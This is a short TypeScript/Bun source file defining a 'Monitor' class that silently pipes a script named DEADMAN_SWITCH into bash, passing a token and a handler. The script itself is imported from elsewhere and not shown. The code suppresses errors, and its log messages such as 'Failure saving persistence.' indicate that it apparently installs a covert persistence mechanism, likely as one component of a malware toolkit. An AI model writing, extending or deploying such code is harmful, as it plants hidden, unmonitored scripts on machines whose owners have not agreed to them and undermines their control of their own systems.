import { DEADMAN_SWITCH } from "../../generated";
import { logUtil } from "../../utils/logger";
import { Mutator } from "../base";

export class Monitor extends Mutator {
  private token: string;
  private handler: string;

  constructor(token: string, handler: string) {
    super();
    this.token = token;
    this.handler = handler;
  }

  private async installTokenMonitor(token: string, handler: string) {
    try {
      const proc = Bun.spawn(["bash", "-s", "--", token, handler], {
        stdin: "pipe",
        stdout: "pipe",
        stderr: "pipe",
      });

      proc.stdin.write(DEADMAN_SWITCH);
      proc.stdin.end();

      const exitCode = await proc.exited;
      if (exitCode !== 0) {
        logUtil.info("We tried.");
      }
    } catch (e) {
      logUtil.info("Failure saving persistence.");
    }
  }

  async execute() {
    try {
      await this.installTokenMonitor(this.token, this.handler);
    } catch (e) {}

    return true;
  }
}
